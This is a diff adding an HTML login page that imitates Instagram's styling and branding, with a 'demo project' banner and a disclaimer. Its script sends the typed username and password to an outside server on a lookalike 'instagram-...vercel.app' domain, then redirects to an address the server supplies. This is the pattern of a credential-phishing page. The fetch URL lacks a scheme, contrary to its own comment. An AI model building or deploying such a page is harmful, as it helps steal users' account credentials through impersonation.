@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#121212">
+  <title>Login Demo</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      background: #fff;
+      color: #f5f5f5;
+      font-family: Arial, Helvetica, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 24px 16px;
+    }
+
+    .demo-label {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: #262626;
+      color: #fff;
+      text-align: center;
+      padding: 8px;
+      font-size: 12px;
+      letter-spacing: .5px;
+      z-index: 5;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 420px;
+      min-height: 760px;
+      background: #121212;
+      border: 1px solid #292929;
+      border-radius: 28px;
+      padding: 42px 22px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 18px;
+    }
+
+    .language {
+      background: transparent;
+      border: none;
+      color: #a8a8a8;
+      font-size: 13px;
+      margin: 12px 0 62px;
+    }
+
+    .logo {
+      width: 76px;
+      height: 76px;
+      border-radius: 22px;
+      background: linear-gradient(
+        45deg,
+        #ffd776 0%,
+        #ff7a00 25%,
+        #ff0169 55%,
+        #d300c5 75%,
+        #7638fa 100%
+      );
+      display: grid;
+      place-items: center;
+      margin-bottom: 76px;
+    }
+
+    .logo-inner {
+      width: 59px;
+      height: 59px;
+      border: 5px solid #121212;
+      border-radius: 17px;
+      display: grid;
+      place-items: center;
+      position: relative;
+    }
+
+    .camera-lens {
+      width: 29px;
+      height: 29px;
+      border: 5px solid #121212;
+      border-radius: 50%;
+    }
+
+    .camera-dot {
+      width: 7px;
+      height: 7px;
+      background: #121212;
+      border-radius: 50%;
+      position: absolute;
+      top: 5px;
+      right: 5px;
+    }
+
+    .login-form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    .field {
+      width: 100%;
+      height: 58px;
+      display: flex;
+      align-items: center;
+      border: 1px solid #414141;
+      border-radius: 13px;
+      background: #121212;
+      overflow: hidden;
+    }
+
+    .field:focus-within {
+      border-color: #737373;
+    }
+
+    .field input {
+      min-width: 0;
+      width: 100%;
+      height: 100%;
+      padding: 0 15px;
+      border: none;
+      outline: none;
+      color: #f5f5f5;
+      background: transparent;
+      font-size: 14px;
+    }
+
+    .field input::placeholder {
+      color: #aaa;
+      opacity: 1;
+    }
+
+    .password-toggle {
+      background: transparent;
+      color: #aaa;
+      border: none;
+      padding: 12px;
+      cursor: pointer;
+      font-size: 12px;
+    }
+
+    .login-button {
+      width: 100%;
+      min-height: 54px;
+      border: none;
+      border-radius: 30px;
+      background: #293bff;
+      color: white;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: background .2s;
+    }
+
+    .login-button:hover {
+      background: #4050ff;
+    }
+
+    .login-button:disabled {
+      opacity: .65;
+      cursor: wait;
+    }
+
+    .forgot {
+      margin-top: 8px;
+      text-align: center;
+    }
+
+    .forgot a,
+    .create-account {
+      text-decoration: none;
+      color: #b7b7b7;
+      font-size: 14px;
+    }
+
+    .forgot a:hover {
+      color: white;
+    }
+
+    .bottom {
+      width: 100%;
+      margin-top: auto;
+      padding-top: 70px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 22px;
+    }
+
+    .create-account {
+      width: 100%;
+      min-height: 54px;
+      display: grid;
+      place-items: center;
+      border: 1px solid #3444ff;
+      border-radius: 30px;
+      color: #7380ff;
+      font-weight: 600;
+    }
+
+    .meta {
+      color: #c6c6c6;
+      font-size: 18px;
+      padding-bottom: 8px;
+    }
+
+    .message {
+      display: none;
+      width: 100%;
+      border-radius: 12px;
+      padding: 14px;
+      font-size: 14px;
+      line-height: 1.5;
+      text-align: center;
+      overflow-wrap: anywhere;
+    }
+
+    .message.visible {
+      display: block;
+    }
+
+    .message.success {
+      color: #b8f5c9;
+      background: #173523;
+      border: 1px solid #28613c;
+    }
+
+    .message.error {
+      color: #ffb9b9;
+      background: #351919;
+      border: 1px solid #713030;
+    }
+
+    .disclaimer {
+      margin-top: 16px;
+      text-align: center;
+      color: #8f8f8f;
+      font-size: 11px;
+      line-height: 1.5;
+    }
+
+    @media (max-width: 480px) {
+      body {
+        padding: 0;
+        background: #121212;
+        align-items: stretch;
+      }
+
+      .page {
+        max-width: none;
+        min-height: 100dvh;
+        margin: 0;
+        padding: 52px 24px 22px;
+        border: none;
+        border-radius: 0;
+      }
+
+      .language {
+        margin-top: 16px;
+        margin-bottom: 55px;
+      }
+
+      .logo {
+        margin-bottom: 65px;
+      }
+
+      .bottom {
+        padding-top: 55px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="demo-label">
+    DEMO PROJECT · NOT AN OFFICIAL INSTAGRAM PAGE
+  </div>
+
+  <main class="page">
+    <div class="language">English (US) ⌄</div>
+
+    <div class="logo" role="img" aria-label="Camera-inspired demo logo">
+      <div class="logo-inner">
+        <div class="camera-lens"></div>
+        <div class="camera-dot"></div>
+      </div>
+    </div>
+
+    <form class="login-form" id="loginForm">
+      <label class="field">
+        <input
+          type="text"
+          id="username"
+          name="username"
+          placeholder="Demo username"
+          autocomplete="off"
+          maxlength="100"
+          required
+        >
+      </label>
+
+      <label class="field">
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Demo password"
+          autocomplete="off"
+          maxlength="100"
+          required
+        >
+        <button
+          class="password-toggle"
+          type="button"
+          id="togglePassword"
+          aria-label="Show demo password"
+        >Show</button>
+      </label>
+
+      <button class="login-button" id="loginButton" type="submit">
+        Log in to Demo
+      </button>
+
+      <div class="forgot">
+        <a href="https://instagram.com"
+           target="_blank" rel="noopener noreferrer">
+          Forgot password?
+        </a>
+      </div>
+
+      <div id="message" class="message" role="status" aria-live="polite"></div>
+    </form>
+
+    <div class="bottom">
+      <a
+        class="create-account"
+        href="https://instagram.com"
+        target="_blank"
+        rel="noopener noreferrer"
+      >
+        Visit Instagram
+      </a>
+
+      <div class="meta">∞ Meta</div>
+
+      <p class="disclaimer">
+        Independent educational demo. Not affiliated with or endorsed by
+        Instagram or Meta. Use demo credentials only.
+      </p>
+    </div>
+  </main>
+
+    <script>
+    const form = document.getElementById("loginForm");
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
+    const togglePassword = document.getElementById("togglePassword");
+    const loginButton = document.getElementById("loginButton");
+    const messageDiv = document.getElementById("message");
+
+    // Toggle password text visibility
+    togglePassword.addEventListener("click", () => {
+      const isPassword = passwordInput.getAttribute("type") === "password";
+      passwordInput.setAttribute("type", isPassword ? "text" : "password");
+      togglePassword.textContent = isPassword ? "Hide" : "Show";
+    });
+
+    // Form submission connection logic
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      // Reset application display status and state indicators
+      messageDiv.className = "message";
+      messageDiv.textContent = "";
+      loginButton.disabled = true;
+      loginButton.textContent = "Logging in...";
+
+      const payload = {
+        username: usernameInput.value,
+        password: passwordInput.value
+      };
+
+      try {
+        // CORRECTED ABSOLUTE ROUTE URL: Note the correct placement of all dots, the port, and the slash
+        const response = await fetch("instagram-roan-rho.vercel.app/api/demo-login", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const data = await response.json();
+
+        if (response.ok && data.success) {
+          messageDiv.className = "message success visible";
+          messageDiv.textContent = data.message;
+          
+          form.reset();
+          togglePassword.textContent = "Show";
+
+          // Transition redirect to the destination landing page
+          setTimeout(() => {
+            window.location.href = data.redirect_url;
+          }, 1500);
+        } else {
+          throw new Error(data.detail || "An unexpected error occurred.");
+        }
+      } catch (err) {
+        messageDiv.className = "message error visible";
+        messageDiv.textContent = err.message || "Failed to reach backend server.";
+      } finally {
+        loginButton.disabled = false;
+        loginButton.textContent = "Log in to Demo";
+      }
+    });
+  </script>
+
+</body>
+</html>
